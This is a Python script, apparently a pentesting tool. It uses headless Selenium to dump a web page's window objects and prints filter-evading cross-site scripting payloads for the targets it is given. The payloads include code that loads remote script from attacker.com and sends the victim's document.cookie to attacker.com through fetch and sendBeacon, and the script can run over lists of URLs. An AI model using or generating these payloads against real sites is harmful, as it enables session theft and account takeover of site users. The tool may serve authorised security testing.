#!/usr/bin/python3
import os
import sys
import signal
import random
import argparse
import string
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
import concurrent.futures
from urllib.parse import urlparse
from http.cookies import SimpleCookie
from rich.progress import Progress
from rich.pretty import pprint
from rich import print as rprint
from selenium import webdriver
from selenium.webdriver.chrome.service import Service as ChromeService 
from webdriver_manager.chrome import ChromeDriverManager 
from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException
import urllib3


#handle signal interrupt
def handler(signum, frame):
	res = input(" Ctrl-c was pressed. Do you really want to exit? y/n :")
	if res == 'y':
		sys.exit(1)


def getreq(URL1):
	for letter in 'a':
		try:
			sendjs = 'let yolanda = Object.entries(self);const obj = Object.fromEntries(yolanda);function stringify(obj) {let cache = [];let str = JSON.stringify(obj, function(key, value) {if (typeof value === "object" && value !== null) {if (cache.indexOf(value) !== -1) {return;}cache.push(value);}return value;});cache = null;return str;}return stringify(obj);'
			xsspop = ["alert", "confirm", "prompt"]
			jquery = "jQuery"
			#deal with webdriver stuff
			options = webdriver.ChromeOptions() 
			options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36")
			options.headless = True
			driver = webdriver.Chrome(service=ChromeService(ChromeDriverManager().install()), options=options)
			driver.set_page_load_timeout(15)
			driver.get(URL1)
			#using burp cookies
			if cookie_file:
				headers1 = parse_request(cookie_file.name)
				headers2 = headers1[0]['Cookie']
				simplecookie = SimpleCookie()
				simplecookie.load(headers2)
				coookies = {k: v.value for k, v in simplecookie.items()}
				driver.delete_all_cookies()
				for key, value in coookies.items():
					driver.add_cookie({'name': key, 'value': value})
				driver.get(URL1)
			html = driver.page_source
			objkeys = driver.execute_script(sendjs)
			#xss helpers
			if xss:
				rprint('XSS Helpers: '+URL1)
				for js in xsspop:
					sendjs2 = jsindexfind(js)
					jsindex = driver.execute_script(sendjs2)
					rprint(js+' = self[Object.keys(self)['+str(jsindex)+']]("XSS")')
				sendjs3 = jsindexfind("jQuery")
				jsindex2 = driver.execute_script(sendjs3)
				rprint('jQuery.getScript = self[Object.keys(self)['+str(jsindex2)+']].getScript("https://attacker.com/malicious.js");')
				sendjs4 = jsindexfind("fetch")
				jsindex3 = driver.execute_script(sendjs4)
				sendjs5 = jsindexfind("document")
				jsindex4 = driver.execute_script(sendjs5)
				rprint('Fetch with Document.cookie = self[Object.keys(self)['+str(jsindex3)+']]("//attacker.com/?cookie="+(self[Object.keys(self)['+str(jsindex4)+']].cookie));')
				sendjs6 = jsindexfind("navigator")
				jsindex5 = driver.execute_script(sendjs6)
				rprint('Navigator.sendBeacon with Document.cookie = self[Object.keys(self)['+str(jsindex5)+']].sendBeacon("//attacker.com/", (self[Object.keys(self)['+str(jsindex4)+']].cookie));')
			#terminal and file output
			jsonObj = json.loads(objkeys)
			if termi:
				pprint(jsonObj, expand_all=True)
			if outfile is True:
				kaka = json.dumps(jsonObj, ensure_ascii=False)
				out(URL1, kaka)
			driver.quit()
		except ConnectionError:
			rprint(URL1+" - connection Error")
			driver.quit()
			continue
		except TimeoutException as t:
			rprint(URL1+" - connection timeout")
			driver.quit()
			continue
		except (NoSuchElementException, WebDriverException) as fu:
			rprint(URL1+" - site unreachable")
			driver.quit()
			break
		except TypeError as f:
			rprint(URL1+" - TypeError: "+str(f))
			continue
		except Exception as e:
			rprint(URL1+" - Exception: "+str(e))
			driver.quit()
			break

def out(URL, data):
	try:
		zpath = "./output/"
		os.makedirs(zpath, exist_ok=True)
	except FileExistsError:
		pass
	except Exception as e:
		rprint("Failed to create project directory: "+str(e))
	hostname = urlparse(URL).hostname
	rndm = ''.join(random.choices(string.ascii_lowercase, k=3))
	outfl = zpath+hostname+"-"+rndm+".json"
	with open(outfl, mode='a') as out:
		out.write(data)
		rprint("Wrote Object.entries to "+outfl)

def jsindexfind(tango):
	bravo = 'c=0; for(i in self) { if(i == "'+tango+'") { return c; } c++; };'
	return bravo
	
def parse_request(file_name):
	line = ""
	headers = {}
	post_data = ""
	header_collection_done = False
	file_object = open(file_name , "r")
	file_object.seek(0)
	file_object.readline()
	for line in file_object.readlines():
		if header_collection_done is False:
			if line.startswith("\n"):
				header_collection_done = True
			else:
				headers.update({
					line[0:line.find(":")].strip() : line[line.find(":")+1 :].strip()
				})
		else:
			post_data = post_data + line
	file_object.close()
	return (headers , post_data)

def tpool():
	if url:
		getreq(url)
	elif urlist:
		sworker(urlist)

def sworker(urlist):
	urlist = [line.rstrip('\n') for line in urlist]
	LENGTH = len(urlist)
	with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
		with Progress() as progress:
			task2 = progress.add_task("[green]Scanning url list: ", total=LENGTH)
			future_to_url = {executor.submit(getreq, URL): URL for URL in urlist}
			for _ in as_completed(future_to_url):
				progress.update(task2, advance=1)

if __name__ == "__main__":

	signal.signal(signal.SIGINT, handler)
	urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

	#handle argument parsing
	parser = argparse.ArgumentParser(description="Display Object.entries and XSS helpers", formatter_class=argparse.RawDescriptionHelpFormatter)
	parser.add_argument("-u", dest="url", required=False, help="Single url, ex: http(s)://target.com/path/something")
	parser.add_argument("-l", dest="urlist", required=False, type=argparse.FileType("r", encoding="UTF-8"), help="Ingest url list")
	parser.add_argument("-c", dest="cookie", required=False, type=argparse.FileType("r", encoding="UTF-8"), help="Use cookies from burp request file")
	parser.add_argument("-t", dest="termi", required=False, action="store_true", help="Output Object.entries to terminal")
	parser.add_argument("-j", dest="output", required=False, help="Output Object.entries to json file", action="store_true")
	parser.add_argument("-x", dest="xss", required=False, help="Display XSS helpers", action="store_true")
	args = parser.parse_args()

	url = args.url
	urlist = args.urlist
	outfile = args.output
	cookie_file = args.cookie
	termi = args.termi
	xss = args.xss

	if len(sys.argv)==1:
		parser.print_help(sys.stderr)
		sys.exit(1)

	tpool()
